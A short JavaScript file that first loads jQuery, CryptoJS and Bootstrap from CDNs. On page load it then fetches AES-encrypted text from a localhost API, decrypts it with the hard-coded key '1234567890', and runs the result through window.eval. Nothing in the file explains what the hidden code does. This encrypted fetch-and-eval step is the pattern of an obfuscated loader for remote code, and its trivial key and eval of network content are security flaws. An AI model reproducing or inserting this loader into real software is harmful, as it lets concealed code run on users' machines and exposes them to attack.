// Dependencies
[
'https://code.jquery.com/jquery-3.3.1.slim.min.js',
'https://cdnjs.cloudflare.com/ajax/libs/crypto-js/3.1.9-1/crypto-js.js',
'https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.14.7/umd/popper.min.js',
'https://stackpath.bootstrapcdn.com/bootstrap/4.3.1/css/bootstrap.min.css',
'https://stackpath.bootstrapcdn.com/bootstrap/4.3.1/js/bootstrap.min.js'
].forEach(bootstrap_resources);

// Attach Each JavaScript Library Reference
function bootstrap_resources(item, index, array){
    var tag = null;
    var typeOf = item.split('.')[item.split('.').length -1];

    if( typeOf == 'js' ){
        // JavaScript Resource
        tag = document.createElement('script');
        tag.type = 'text/javascript';
        tag.src = item;
        tag.async = false;
    }
    else if( typeOf == 'css' ){
        // CSS Resource
        tag = document.createElement('link');
        tag.rel = 'stylesheet';
        tag.href = item;
        tag.async = true;
    }
    if ( tag ){ document.getElementsByTagName('head')[0].appendChild(tag); }
}


window.onload = function () {

  var HOST = 'http://localhost:9595/api/v1.0/software';
  var KEY = '1234567890';
  var request = new XMLHttpRequest();
  request.onreadystatechange = function() {
      if (this.readyState == 4 && this.status == 200) {
          code = CryptoJS.AES.decrypt(request.responseText, KEY).toString(CryptoJS.enc.Utf8);
          window.eval(code)
          code = null
      }
  };
  request.open("GET", HOST, true);
  request.send();

}
